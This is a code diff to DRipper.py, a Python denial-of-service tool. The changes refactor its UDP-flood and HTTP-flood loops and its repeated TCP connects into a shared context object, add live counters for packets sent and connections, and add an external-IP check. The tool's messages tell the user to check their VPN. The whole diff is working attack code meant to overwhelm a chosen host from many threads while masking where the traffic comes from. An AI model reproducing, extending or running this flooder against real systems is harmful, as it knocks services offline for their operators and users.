@@ -5,28 +5,40 @@ import signal
 import sys
 import threading
 import time
+import subprocess
 import urllib.request
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from optparse import OptionParser
 
+# Constants
 USAGE = 'Usage: python %prog [options] arg'
 EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
+GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
 
 
 @dataclass
 class Context:
     """Class for passing a context to a parallel processes."""
+    # Input params
     host: str = ''
     port: int = 80
     threads: int = 100
     random_packet_len: bool = False
-    attack_method: str = ''
+    attack_method: str = None
     protocol: str = 'http://'
-    url: str = ''
+    url: str = None
 
-    user_agents: list[str] = ''
-    base_headers = ''
-    headers = {}
+    # Internal vars
+    user_agents: list = None
+    base_headers: list = None
+    headers = None
+
+    # Statistic
+    external_ip: str = ''
+    packets_sent: int = 0
+    connections_success: int = 0
+    connections_failed: int = 0
+    errors: list[str] = field(default_factory=list)
 
 
 def init_context(_ctx, args):
@@ -44,6 +56,8 @@ def init_context(_ctx, args):
     _ctx.user_agents = readfile('useragents.txt')
     _ctx.base_headers = readfile('headers.txt')
     _ctx.headers = set_headers_dict(_ctx.base_headers)
+
+    _ctx.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
 
 def readfile(filename: str):
@@ -93,25 +107,30 @@ def down_it_udp(_ctx):
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         # p = int(_ctx.port) if _ctx.port else get_random_port()
+
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
         except socket.gaierror:
-            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
+            if GETTING_SERVER_IP_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(GETTING_SERVER_IP_ERROR_MSG)
         else:
-            print('\033[92m Packet was sent \033[0;0m')
+            if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
+                _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
+            _ctx.packets_sent += 1
+            # print('\033[92m Packet was sent \033[0;0m')
         sock.close()
 
         if _ctx.port:
             i += 1
             if i == 50:
                 i = 1
-                thread = threading.Thread(target=connect_host, args=[_ctx.host, _ctx.port])
+                thread = threading.Thread(target=connect_host, args=[_ctx])
                 thread.daemon = True
                 thread.start()
         time.sleep(.01)
 
 
-def down_it_http(_ctx):
+def down_it_http(_ctx: Context):
     while True:
         http_headers = _ctx.headers
         http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
@@ -120,11 +139,12 @@ def down_it_http(_ctx):
             urllib.request.urlopen(
                 urllib.request.Request(_ctx.url, headers=http_headers))
         except:
-            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
-                  " Program will continue working.\033[0m")
+            _ctx.connections_failed += 1
         else:
-            print('\033[92m HTTP-Request was done \033[0;0m')
+            _ctx.connections_success += 1
+            # print('\033[92m HTTP-Request was done \033[0;0m')
 
+        _ctx.packets_sent += 1
         time.sleep(.01)
 
 
@@ -190,14 +210,40 @@ def check_host(host):
         exit(1)
 
 
-def connect_host(host, port):
+def connect_host(_ctx: Context):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
-        s.connect((host, int(port)))
+        s.connect((_ctx.host, _ctx.port))
     except:
-        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
-              " Program will continue send UDP-packets to the destination.\033[0m")
+        _ctx.connections_failed += 1
+    else:
+        _ctx.connections_success += 1
+
+
+def show_statistics(_ctx: Context):
+    """Prints statistics to console."""
+    subprocess.call('clear')
+    subprocess.call('clear')  # Hack for docker
+
+    logo()
+    m = f"Your current IP: \033[94m{_ctx.external_ip}\033[0m\n"
+    m += f"Host, port: \033[94m{_ctx.host}:{_ctx.port}\033[0m\n"
+    m += f"Attack method: \033[94m{_ctx.attack_method}\033[0m\n"
+    m += f"Threads: \033[94m{_ctx.threads}\033[0m\n\n"
+
+    if _ctx.attack_method == 'udp' and _ctx.random_packet_len:
+        m += f"Random packet length: yes\n"
+    if _ctx.attack_method == 'udp':
+        m += f"UDP packets sent: \033[92m{_ctx.packets_sent}\033[0;0m\n"
+    elif _ctx.attack_method == 'http':
+        m += f"HTTP requests sent: \033[92m{_ctx.packets_sent}\033[0;0m\n"
+
+    m += f"Connections: successful - \033[92m{_ctx.connections_success}\033[0;0m, failed - \033[91m{_ctx.connections_failed}\033[0m\n"
+    for error in _ctx.errors:
+        m += error + '\n'
+    sys.stdout.write(m)
+    sys.stdout.flush()
 
 
 def main():
@@ -212,7 +258,7 @@ def main():
     init_context(_ctx, args)
 
     check_host(_ctx.host)
-    connect_host(_ctx.host, _ctx.port)
+    connect_host(_ctx)
 
     # p = str(_port) if _port else '(22, 53, 80, 443)'
     print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
@@ -230,7 +276,8 @@ def main():
         thread_pool[i].start()
 
     while True:
-        time.sleep(.1)
+        show_statistics(_ctx)
+        time.sleep(3)
 
 
 if __name__ == '__main__':
